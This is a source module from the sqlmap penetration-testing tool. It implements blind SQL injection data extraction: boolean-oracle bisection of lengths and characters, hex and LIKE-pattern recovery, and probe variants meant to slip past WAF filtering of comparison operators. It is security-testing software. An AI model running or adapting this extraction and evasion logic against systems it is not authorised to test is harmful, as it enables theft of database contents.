#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import binascii

from .atlas import _FREQ_ORDER
from .atlas import _HEX_Q_ENCODINGS
from .atlas import _HEXDIGITS
from .atlas import _HEXFN
from .atlas import _isSingleUnicodeScalar
from .atlas import _MAX_HEX_CHAR_NIBBLES
from .atlas import _native
from .atlas import _PRINTABLE_SORTED
from .atlas import _REPL
from .atlas import _SIMILAR_META
from .atlas import _UNICODE_MAX
from .atlas import _unhexlify
from .atlas import _unichr
from .records import Cap
from .records import ExtractResult


class _Extraction(object):
    """_Extraction

    turn the discovered dialect into VALUES: length, char reading, literals, hex,
    the public extract*/read* API, and the LIKE pattern-match floor."""

    def _charExists(self, expr, pos):
        # is there a real character at 1-based `pos`? derived from the substring's
        # measured end behavior - the basis for length when no length fn exists.
        one = self._sub(expr, pos, 1)
        if self.dialect.substring.get("beyond_end") == "null-or-error":
            return self._ask("%s IS NOT NULL" % one)
        return self._ask("%s IS NOT NULL" % one) and not self._ask("%s=''" % one)

    def _measureLengthSub(self, expr, ceiling):
        # length via substring: find the largest position that still holds a char.
        # mirrors _measureLength's exponential-then-bisect shape (len>N <=> a char
        # exists at N+1), for backends with substring but no length fn.
        if not self._charExists(expr, 1):
            return (None if self._ask("(%s) IS NULL" % expr) else 0), False
        if self._charExists(expr, ceiling + 1):
            return ceiling, True
        low, high = 1, min(8, ceiling)
        while high < ceiling and self._charExists(expr, high + 1):
            low = high + 1
            high = min(high * 2, ceiling)
        while low < high:
            mid = (low + high) // 2
            if self._charExists(expr, mid + 1):
                low = mid + 1
            else:
                high = mid
        return low, False

    def _hasChars(self, expr):
        # non-empty existence check that works with either a length fn or substring
        if self.dialect.length is not None:
            lexpr = self._len(expr)
            return self._numDefined(lexpr) and not self._ask("%s=0" % lexpr)
        if self.dialect.substring is not None:
            return self._charExists(expr, 1)
        return False

    def _lenEquals(self, expr, n):
        # exact-length corroboration used in discovery, length-fn or substring-derived
        if self.dialect.length is not None:
            return self._ask("%s=%d" % (self._len(expr), n))
        if self.dialect.substring is not None:
            return self._measureLength(expr, ceiling=max(n + 1, 8))[0] == n
        return False

    def _measureLength(self, expr, ceiling=None):
        """Return (length, truncated) - no shared per-call state, and a separate
        `ceiling` so hex/byte pulls can be capped independently of maxlen."""
        ceiling = self.maxlen if ceiling is None else ceiling
        if self.dialect.length is None:
            return self._measureLengthSub(expr, ceiling)
        lexpr = self._len(expr)
        if not self._numDefined(lexpr):
            return None, False
        if self._ask("%s=0" % lexpr):
            return 0, False
        if ceiling < 1:                     # non-empty value but capped to nothing (maxlen=0)
            return 0, True
        n = self._readNum(lexpr, 1, ceiling)
        return n, n >= ceiling              # at the cap -> treat as (possibly) truncated

    def valueLength(self, expr):
        length, truncated = self._measureLength(expr)
        self._lastTruncated = truncated
        return length

    def _literalVariants(self, value):
        # spellings to try for exact char verification; SQL Server & others need an
        # N'...' prefix to preserve non-ASCII, cheap vs accepting a wrong candidate
        yield self._lit(value)
        if any(ord(c) > 127 for c in value):
            yield "N%s" % self._lit(value)

    def _exactCharEquals(self, expr, value):
        return any(self._exactEquals(expr, lit) for lit in self._literalVariants(value))

    def _lit(self, ch):
        # double single quotes always; also double backslashes on engines that treat
        # '\' as an escape char (MySQL/MariaDB default), else '\' + "'" would break
        # the literal and silently corrupt the probe
        if self._backslashEscape is None:
            self._backslashEscape = (self.dialect.length is not None
                                     and self._ask("%s=1" % self._len("'\\\\'")))
        s = ch.replace("\\", "\\\\") if self._backslashEscape else ch
        return _native("'%s'" % s.replace("'", "''"))

    def _bisectCharset(self, greater):
        # greater(c) -> is the source char strictly greater than charset char c?
        cs = _PRINTABLE_SORTED
        lo, hi = 0, len(cs) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            if greater(cs[mid]):
                lo = mid + 1
            else:
                hi = mid
        return cs[lo]

    def _gtNum(self, expr, n, high):
        # "is `expr` > n?" via the discovered comparator (high = current upper bound).
        # BETWEEN expresses the same range test without the '>'/'<' a WAF may strip.
        if self._comparator == "between":
            return self._ask("%s BETWEEN %d AND %d" % (expr, n + 1, high))
        if self._comparator == "sign":
            return self._ask("SIGN((%s)-(%d))=1" % (expr, n))
        return self._ask("%s>%d" % (expr, n))

    def _numDefined(self, expr):
        # value is a defined (non-NULL) number - validity gate that needs no '>'
        return self._ask("(%s) IS NOT NULL" % expr)

    def _readNum(self, expr, lo, hi):
        # bounded numeric read in [lo, hi]. ordered comparators bisect (exponential
        # first so a small value in a big range stays cheap); the order-free path
        # scans fixed windows then IN-bisects inside the hit window (IN lists bounded).
        if self._comparator != "membership":
            low, high = lo, min(max(lo, 8), hi)
            while high < hi and self._gtNum(expr, high, hi):
                low, high = high + 1, min(high * 2, hi)
            while low < high:
                mid = (low + high) // 2
                if self._gtNum(expr, mid, hi):
                    low = mid + 1
                else:
                    high = mid
            return low
        if self._inOk:
            window = 128
            base = lo
            while base <= hi:
                win = list(range(base, min(base + window, hi + 1)))
                if self._ask("%s IN (%s)" % (expr, ",".join(str(v) for v in win))):
                    while len(win) > 1:
                        half = win[:len(win) // 2]
                        if self._ask("%s IN (%s)" % (expr, ",".join(str(v) for v in half))):
                            win = half
                        else:
                            win = win[len(win) // 2:]
                    return win[0]
                base += window
            return hi
        # no ordered op and no IN: plain '=' scan (bounded by hi; small values first)
        for v in range(lo, hi + 1):
            if self._ask("%s=%d" % (expr, v)):
                return v
        return hi

    def _bisectCodes(self, code, codes):
        # ordered bisection over a sorted code list (restricted alphabet)
        lo, hi = 0, len(codes) - 1
        top = codes[hi]
        while lo < hi:
            mid = (lo + hi) // 2
            if self._gtNum(code, codes[mid], top):
                lo = mid + 1
            else:
                hi = mid
        return codes[lo]

    def _bisectCodeRange(self, code):
        # general dynamic-range bisection - a real code-point fn can far exceed 255,
        # so find the tight upper bound first, then bisect
        high = _UNICODE_MAX
        for cap in (127, 255, 0xFFFF, _UNICODE_MAX):
            if not self._gtNum(code, cap, _UNICODE_MAX):
                high = cap
                break
        low = 0
        while low < high:
            mid = (low + high) // 2
            if self._gtNum(code, mid, high):
                low = mid + 1
            else:
                high = mid
        return low

    def _pickCode(self, code, codes):
        # order-free code selection when there's no ordered comparator: IN() subset
        # bisection if available, else a plain '=' scan (last resort, no '<>' needed)
        if self._inOk:
            return self._membershipCode(code, codes)
        for c in codes:
            if self._ask("%s=%d" % (code, c)):
                return c
        return None

    def _membershipCode(self, code, codes):
        # ORDER-FREE subset bisection: split the candidate code list in half and test
        # `code IN (half)` - needs only '='/IN, so it survives blocked '>'/'<'/BETWEEN
        # and collation quirks. ~log2(n) probes. Returns the matched code, or None
        # when the char is outside `codes` (caller escalates to hex / marks it).
        if not self._inOk or not self._ask("%s IN (%s)" % (code, ",".join(str(c) for c in codes))):
            return None
        cand = list(codes)
        while len(cand) > 1:
            half = cand[:len(cand) // 2]
            if self._ask("%s IN (%s)" % (code, ",".join(str(c) for c in half))):
                cand = half
            else:
                cand = cand[len(cand) // 2:]
        return cand[0]

    def _membershipLit(self, one, chars):
        # order-free subset bisection over char LITERALS (no code fn, no ordering) -
        # `chars` is frequency-ordered so the common half resolves first
        if not self._inOk or not self._ask("%s IN (%s)" % (one, ",".join(self._lit(c) for c in chars))):
            return None
        cand = list(chars)
        while len(cand) > 1:
            half = cand[:len(cand) // 2]
            if self._ask("%s IN (%s)" % (one, ",".join(self._lit(c) for c in half))):
                cand = half
            else:
                cand = cand[len(cand) // 2:]
        return cand[0]

    def _ensureHexfn(self):
        # a hex fn may not have been discovered (code/collation mode won the ladder
        # before hex was tried); probe for one on demand so escalation can recover
        # bytes exactly. probes at most once.
        if self.dialect.hexfn is None and not self._hexProbed:
            self._hexProbed = True
            with self._probePhase():        # wrong rungs (e.g. HEX() on PostgreSQL) error -> "unusable", not undecided
                for name, tmpl in _HEXFN:
                    enc = self._hexEncoding(tmpl)
                    if enc:
                        self.dialect.hexfn = Cap(name, tmpl, encoding=enc)
                        break
        return self.dialect.hexfn

    def _hexEncoding(self, tmpl):
        # if `tmpl` hex-encodes a char, return the codec that decodes it (utf-8 /
        # utf-16-be / utf-16-le), else None. 'q'(0x71) must map to that codec's form
        # AND track the char (a DIFFERENT value for 'p'), so a constant can't match.
        hq = tmpl.format(expr=self._sub("'sqlmap'", 2, 1))     # 'q'
        hp = tmpl.format(expr=self._sub("'sqlmap'", 6, 1))     # 'p'
        for form, enc in _HEX_Q_ENCODINGS:
            if self._ask("%s='%s'" % (hq, form)) and not self._ask("%s='%s'" % (hp, form)):
                return enc
        return None

    def _escalate(self, one, pos):
        # candidate did not verify -> char is outside the searched alphabet.
        # recover its exact bytes via hex if available; otherwise mark it (never
        # silently substitute a space/'~' or delete it)
        if self._ensureHexfn():
            ch = self._readHexChar(one)
            if ch and ch != _REPL:
                return ch
        self.dialect.notes.append("char at position %d outside extraction alphabet - marked" % pos)
        return _REPL

    def _readChar(self, expr, pos, codes=None):
        one = self._sub(expr, pos, 1)
        mode = self.dialect.compare

        if mode == "code":
            code = self.dialect.charcode[1].format(expr=one)
            ordered = self._comparator in ("gt", "between")
            if codes is not None:
                # restricted-alphabet (e.g. the hex-framed dump payload): a small ASCII
                # set. no per-char verify - ASCII codes are unambiguous across charcode
                # semantics and extractResult whole-value verifies.
                low = self._bisectCodes(code, codes) if ordered else self._pickCode(code, codes)
                return _unichr(low) if low is not None else self._escalate(one, pos)
            if ordered:
                low = self._bisectCodeRange(code)
            else:
                # no ordered operator: order-free IN() over the printable set (or a '='
                # scan if IN is gone too); anything outside it escalates to hex / marks
                low = self._pickCode(code, [ord(c) for c in _PRINTABLE_SORTED])
                if low is None:
                    return self._escalate(one, pos)
            if 0xD800 <= low <= 0xDFFF:
                # a UTF-16 code-unit fn (SQL Server UNICODE under a non-SC collation)
                # can return an isolated surrogate - not a scalar; recover via bytes
                return self._escalate(one, pos)
            try:
                ch = _unichr(low)            # low==0 is a valid NUL char, not "empty"
            except ValueError:
                return self._escalate(one, pos)
            # a lossy code fn can return a codepage byte, a UTF-8 lead byte, or even
            # '?' (63) for an unrepresentable char - the old low>127-only check
            # silently accepted the last as a literal '?'. only a *proven* code-point
            # fn is trusted outright; everything else must round-trip-verify.
            if self.dialect.charcode.get("semantics") != "codepoint" and \
               not self._exactCharEquals(one, ch):
                return self._escalate(one, pos)
            return ch

        if mode == "hex":
            if self.dialect.hexfn is None:
                return self._escalate(one, pos)
            return self._readHexChar(one)

        if mode == "collation":
            if self.dialect.binwrap is None:
                return self._escalate(one, pos)
            w = self.dialect.binwrap[1]
            cand = self._bisectCharset(lambda c: self._ask("%s>%s" % (w.format(x=one), w.format(x=self._lit(c)))))
            if self._ask("%s=%s" % (w.format(x=one), w.format(x=self._lit(cand)))):
                return cand
            return self._escalate(one, pos)

        if mode == "ordinal":
            cand = self._bisectCharset(lambda c: self._ask("%s>%s" % (one, self._lit(c))))
            if self._ask("%s=%s" % (one, self._lit(cand))):
                return cand
            return self._escalate(one, pos)

        # equality / equality-ci: order-free IN() subset bisection (frequency-ordered,
        # ~log2(n) probes) when IN is usable, else the linear frequency scan
        if self._inOk:
            ch = self._membershipLit(one, _FREQ_ORDER)
            return ch if ch is not None else self._escalate(one, pos)
        for ch in _FREQ_ORDER:
            if self._ask("%s=%s" % (one, self._lit(ch))):
                return ch
        return self._escalate(one, pos)

    def _readHexChar(self, one):
        # read the uppercase-hex byte string of a single source char, digit by
        # digit over [0-9A-F] (case-safe), then pick the encoding by exact round-trip
        # against the source (decoder order alone is endian-ambiguous: 00 41 is both
        # UTF-16BE 'A' and UTF-16LE U+4100).
        hexpr = self.dialect.hexfn[1].format(expr=one)
        hlen, htrunc = self._measureLength(hexpr, ceiling=_MAX_HEX_CHAR_NIBBLES)
        if htrunc or not hlen or hlen % 2 or hlen > _MAX_HEX_CHAR_NIBBLES:
            return _REPL
        # bisect each nibble over [0-9A-F] when hex ordering is reliable (~4 asks
        # vs up to 16); fall back to an equality scan otherwise
        if self._hexOrdered is None:
            self._hexOrdered = (self._ask("'A'>'9'") and self._ask("'F'>'A'") and self._ask("'1'>'0'"))
        digits = ""
        for k in range(1, hlen + 1):
            nib = self._sub(hexpr, k, 1)
            if self._hexOrdered:
                lo, hi = 0, len(_HEXDIGITS) - 1
                while lo < hi:
                    mid = (lo + hi) // 2
                    if self._ask("%s>'%s'" % (nib, _HEXDIGITS[mid])):
                        lo = mid + 1
                    else:
                        hi = mid
                # verify: if nib isn't actually this hex digit (WAF/glitch), bail
                if not self._ask("%s='%s'" % (nib, _HEXDIGITS[lo])):
                    return _REPL
                digits += _HEXDIGITS[lo]
            else:
                for hd in _HEXDIGITS:
                    if self._ask("%s='%s'" % (nib, hd)):
                        digits += hd
                        break
                else:
                    return _REPL
        try:
            raw = _unhexlify(digits)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return _REPL
        # generate every single-scalar candidate and pick the one that round-trips
        # against the source char (resolves the endian ambiguity), preferring the
        # interleaved-NUL-signalled endianness order first
        order = []
        if len(raw) >= 2 and raw[0:1] == b"\x00" and raw[1:2] != b"\x00":
            order += ["utf-16-be", "utf-32-be"]
        if len(raw) >= 2 and raw[1:2] == b"\x00" and raw[0:1] != b"\x00":
            order += ["utf-16-le", "utf-32-le"]
        # UTF first (near-universal), then legacy single/multibyte charsets a non-Unicode
        # backend may hex; each is TRIED only when it round-trips against the source char
        # (see _exactCharEquals below), so adding codecs can only recover MORE, never
        # mis-decode. latin-1 stays last (it accepts any single byte).
        order += ["utf-8", "utf-16-le", "utf-16-be", "utf-32-le", "utf-32-be",
                  "cp1252", "cp1251", "gbk", "shift_jis", "euc-kr", "big5", "latin-1"]
        seen = set()
        for enc in order:
            try:
                dec = raw.decode(enc)
            except (UnicodeDecodeError, ValueError):
                continue
            if dec in seen or not _isSingleUnicodeScalar(dec):
                continue
            seen.add(dec)
            if self._exactCharEquals(one, dec):
                return dec
        return _REPL

    def _textable(self, expr):
        # extraction needs BOTH length and substring to work; length may implicitly
        # cast where substring won't (MSSQL CONCAT(int,..) vs SUBSTRING(int,..)),
        # so the substring primitive must be probed too. with no length fn, the
        # substring probe alone is the textability test.
        length_ok = self.dialect.length is None or self._numDefined(self._len(expr))
        return length_ok and self._ask("%s IS NOT NULL" % self._sub(expr, 1, 1))

    def _resolveText(self, expr):
        # if the expression isn't directly substringable (e.g. a numeric/date column
        # on a strict engine), wrap it in the discovered text cast
        if self._textable(expr):
            return expr
        if self.dialect.textcast is not None and self._ask("%s IS NOT NULL" % expr):
            casted = self.dialect.textcast[1].format(expr=expr)
            if self._textable(casted):
                return casted
        return expr

    def coalesce(self, expr, fallback="''"):
        return self.dialect.coalesce[1].format(expr=expr, fallback=fallback) if self.dialect.coalesce else expr

    def _concatMany(self, parts):
        if len(parts) == 1:
            return parts[0]
        func = self.dialect.concat.get("variadic") if self.dialect.concat else None
        if func:                                     # flat CONCAT(a,b,c,...) when variadic
            return "%s(%s)" % (func, ",".join(parts))
        out = parts[0]
        for p in parts[1:]:
            out = self.dialect.concat[1].format(a=out, b=p)
        return out

    def buildLiteral(self, value):
        """Build a SQL string literal for `value`. Prefers CHAR(code)||... from the
        discovered char-from-code + concat primitives (no quote-escaping pitfalls),
        for ASCII values; otherwise a doubled-quote literal."""
        if value and self.dialect.charfrom and self.dialect.concat and all(0 < ord(c) < 128 for c in value):
            return self._concatMany([self.dialect.charfrom[1].format(code=ord(c)) for c in value])
        return self._lit(value)

    def extract(self, expr, limit=None):
        return self.extractResult(expr, limit).value

    def extractResult(self, expr, limit=None, _ceiling=None, _verify=True, codes=None):
        """Structured text extraction keeping NULL / empty / truncated / failed
        distinct - never conflated into one ambiguous ''/None. `codes` restricts the
        char alphabet (sorted code list) for a big speedup on known-alphabet values."""
        if self.dialect.prefix is not None and self.dialect.substring is None:
            return self._likeExtract(expr, limit)      # MAX-CONSTRAINT pattern-match path
        q0 = self._queries
        expr = self._resolveText(expr)
        ceiling = self.maxlen if _ceiling is None else _ceiling
        length, truncated = self._measureLength(expr, ceiling=ceiling)
        if length is None:
            # >=0 was false: either a genuine NULL or the probe itself failed.
            # PROVE `IS NULL` positively - negating a failed `IS NOT NULL` used to
            # turn every invalid expression into a convincing, "complete" NULL.
            is_null = self._ask("(%s) IS NULL" % expr)
            return ExtractResult(None, is_null=is_null, complete=is_null,
                                 queries=self._queries - q0,
                                 warnings=[] if is_null else ["length probe failed"])
        if limit is not None and limit < length:
            truncated = True                    # a bounded prefix of a longer value
            length = limit
        value = "" if length == 0 else "".join(self._readChar(expr, i, codes) for i in range(1, length + 1))
        warns = ["contains unresolved char"] if _REPL in value else []
        if self.dialect.compare == "equality-ci":
            warns.append("lossy equality collation: case/accents ambiguous")
        complete = not truncated and not warns
        # a length fn can stop at an embedded NUL, yielding a convincing short prefix.
        # ALWAYS verify the WHOLE reconstructed value once - _exactEquals uses the
        # strongest available comparator (hex > binary wrapper > plain equality); even
        # plain equality catches a NUL-truncated prefix. recover via hex on mismatch.
        # (_verify=False on the internal hex-string pull to avoid re-entry.)
        if _verify and complete and not self._exactEquals(expr, self._lit(value)):
            recovered = self._extractViaHex(expr, q0)
            if recovered is not None:
                return recovered
            complete = False
            warns.append("whole-value verification failed")
        return ExtractResult(value, complete=complete, truncated=truncated,
                             queries=self._queries - q0, warnings=warns)

    def _extractViaHex(self, expr, q0=None):
        # recover a full text value through strict hex extraction, or None
        if not self._ensureHexfn():
            return None
        q0 = self._queries if q0 is None else q0
        res = self.extractResult(self.dialect.hexfn[1].format(expr=expr),
                                  _ceiling=self.maxbytes * 2, _verify=False)
        if res.is_null:
            return ExtractResult(None, is_null=True, complete=True, queries=self._queries - q0)
        if res.value is None or not res.complete or res.truncated or res.warnings:
            return None
        dec = self._decodeHexToken(res.value)
        if dec is None:
            return None
        return ExtractResult(dec, complete=True, queries=self._queries - q0,
                             warnings=["recovered via hex after verification mismatch"])

    def _exactEquals(self, left, right):
        # whole-value equality that avoids collation/trailing-space lies
        if self._ensureHexfn():
            t = self.dialect.hexfn[1]
            return self._ask("(%s)=(%s)" % (t.format(expr=left), t.format(expr=right)))
        if self.dialect.binwrap:
            t = self.dialect.binwrap[1]
            return self._ask("(%s)=(%s)" % (t.format(x=left), t.format(x=right)))
        return self._ask("(%s)=(%s)" % (left, right))

    def extractInteger(self, expr, maximum=None):
        """Extract a (possibly signed) integer by range-bounded bisection - avoids
        stringifying and reading digit-by-digit."""
        cap = maximum if maximum is not None else 1 << 62
        if self._comparator != "gt":
            # BETWEEN / order-free IN(): read the non-negative magnitude (counts,
            # lengths - the only integers enumeration needs). ceil bounds the
            # order-free window scan; hitting it overflows rather than saturating.
            if not self._numDefined(expr):
                return None
            ceil = cap if self._comparator == "between" else min(cap, 1 << 16)
            n = self._readNum(expr, 0, ceil)
            if n >= ceil and ceil < cap:
                raise OverflowError("integer exceeds maximum %d" % ceil)
            return n
        if not self._ask("%s>=0" % expr):
            if not self._ask("%s<0" % expr):
                return None                     # NULL or non-numeric
            if self._ask("%s<%d" % (expr, -cap)):   # symmetric: negative side capped too
                raise OverflowError("integer below minimum -%d" % cap)
            hi = -1
            lo = -2
            while self._ask("%s<%d" % (expr, lo)):
                hi = lo
                lo *= 2
            while lo < hi:
                mid = -((-lo + -hi) // 2)       # ceil toward zero
                if self._ask("%s<%d" % (expr, mid)):
                    hi = mid - 1
                else:
                    lo = mid
            return lo
        lo, hi = 0, 1
        while hi < cap and self._ask("%s>%d" % (expr, hi)):
            lo = hi + 1
            hi = min(hi * 2 + 1, cap)
        if hi == cap and self._ask("%s>%d" % (expr, cap)):
            raise OverflowError("integer exceeds maximum %d" % cap)   # never saturate silently
        while lo < hi:
            mid = (lo + hi) // 2
            if self._ask("%s>%d" % (expr, mid)):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extractBytes(self, expr):
        """Extract the exact bytes of a string/blob expression via a hex function.
        Byte-exact and collation-independent (the hex string is ASCII [0-9A-F], so
        whatever compare mode is active reads it cleanly). Returns None if no hex
        function is available on the target."""
        if not self._ensureHexfn():
            return None
        # hex doubles the length; cap by maxbytes (a char can be several bytes),
        # not maxlen
        res = self.extractResult(self.dialect.hexfn[1].format(expr=expr),
                                  _ceiling=self.maxbytes * 2, _verify=False)
        hexstr = res.value
        # STRICT: never clean corruption into believable bytes. reject a non-hex
        # char, odd length, incomplete/truncated pull, or an unresolved marker.
        if hexstr is None or not res.complete or res.truncated or res.warnings:
            return None
        if len(hexstr) % 2 or any(c not in _HEXDIGITS + _HEXDIGITS.lower() for c in hexstr):
            return None
        try:
            return _unhexlify(hexstr)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return None

    def extractText(self, expr, encoding="utf-8", errors="replace"):
        """Extract bytes then decode with a caller-chosen encoding - the reliable
        path when the column's charset is known (e.g. a CP1252 VARCHAR, a UTF-16
        NVARCHAR, or a binary blob). Falls back to char-by-char extract() when the
        target has no hex function."""
        raw = self.extractBytes(expr)
        if raw is None:
            return self.extract(expr)
        return raw.decode(encoding, errors)

    def _likePat(self, prefix_singles, ch, trailing):
        # build a LIKE/GLOB/SIMILAR-TO pattern literal: `single`*before + one literal
        # char + `single`*after. only `ch` may be special, escaped if so.
        p = self.dialect.prefix
        multi, single = p.get("multi"), p.get("single")
        body = single * prefix_singles
        if p.name == "GLOB" and ch in (multi, single, "["):
            body += "[%s]" % ch                 # GLOB escapes via a char class
            return body + (single * trailing), ""
        # SIMILAR TO shares %/_ with LIKE but also has regex metachars; LIKE has only %/_
        special = _SIMILAR_META if p.name == "SIMILAR TO" else (multi, single)
        if ch in special:
            body += "\\" + ch                   # escape via ESCAPE '\'
            return body + (single * trailing), " ESCAPE '\\'"
        body += ch.replace("'", "''")
        return body + (single * trailing), ""

    def _likeIs(self, expr, pattern, esc):
        return self._ask("(%s) %s '%s'%s" % (expr, self.dialect.prefix.name, pattern, esc))

    def _likeExtract(self, expr, limit=None):
        p = self.dialect.prefix
        multi, single = p.get("multi"), p.get("single")
        q0 = self._queries
        # NULL vs matches-anything-nonnull
        if not self._likeIs(expr, multi, ""):
            is_null = self._ask("(%s) IS NULL" % expr)
            return ExtractResult(None, is_null=is_null, complete=is_null,
                                 queries=self._queries - q0,
                                 warnings=[] if is_null else ["pattern probe failed"])
        if self._likeIs(expr, "", ""):                 # empty string matches only ''
            return ExtractResult("", complete=True, queries=self._queries - q0)
        # length from wildcards: `_`*n + `%` matches iff length >= n. find the
        # largest n that still matches (keep a known-true lower bound; the exponential
        # must NOT advance lo past the true region)
        ge = lambda n: self._likeIs(expr, single * n + multi, "")
        hi = 1
        while hi < self.maxlen and ge(hi):
            hi = min(hi * 2, self.maxlen)
        lo = 1                                          # ge(1) is true (non-empty)
        while lo < hi:
            mid = (lo + hi + 1) // 2
            lo, hi = (mid, hi) if ge(mid) else (lo, mid - 1)
        length = lo
        truncated = length >= self.maxlen and ge(self.maxlen)
        if limit is not None and limit < length:
            truncated, length = True, limit
        out = []
        for i in range(length):
            hit = None
            for c in _FREQ_ORDER:
                pat, esc = self._likePat(i, c, length - i - 1)
                if self._likeIs(expr, pat, esc):
                    hit = c
                    break
            out.append(hit if hit is not None else _REPL)
        value = "".join(out)
        warns = ["contains unresolved char"] if _REPL in value else []
        if p.get("case_insensitive"):
            warns.append("LIKE is case-insensitive: letter case may be ambiguous")
        return ExtractResult(value, complete=not truncated and not warns, truncated=truncated,
                             queries=self._queries - q0, warnings=warns)

    @staticmethod
    def _decodeHexToken(token, encoding=None):
        if len(token) % 2 or any(c not in _HEXDIGITS + _HEXDIGITS.lower() for c in token):
            return None                          # strict: don't clean corruption
        try:
            raw = _unhexlify(token)
        except (TypeError, ValueError, binascii.Error, UnicodeError):
            return None
        if encoding:
            return raw.decode(encoding, "replace")
        # UTF-16LE (SQL Server nvarchar) is *also* valid UTF-8 when ASCII-ish, so a
        # utf-8-first guess silently mis-decodes it; detect the interleaved-null
        # signature first
        if len(raw) >= 2 and len(raw) % 2 == 0 and any(raw[i] == 0 for i in range(1, len(raw), 2)):
            try:
                return raw.decode("utf-16-le")
            except UnicodeDecodeError:
                pass
        # UTF-16BE (h2/HSQLDB RAWTOHEX) has nulls at EVEN offsets; catch it before the
        # utf-8 guess below "succeeds" by reading those nulls as NUL-interleaved text
        if len(raw) >= 2 and len(raw) % 2 == 0 and any(raw[i] == 0 for i in range(0, len(raw), 2)):
            try:
                return raw.decode("utf-16-be")
            except UnicodeDecodeError:
                pass
        for enc in ("utf-8", "utf-16-le", "latin-1"):
            try:
                return raw.decode(enc)
            except (UnicodeDecodeError, ValueError):
                continue
        return raw.decode("latin-1", "replace")
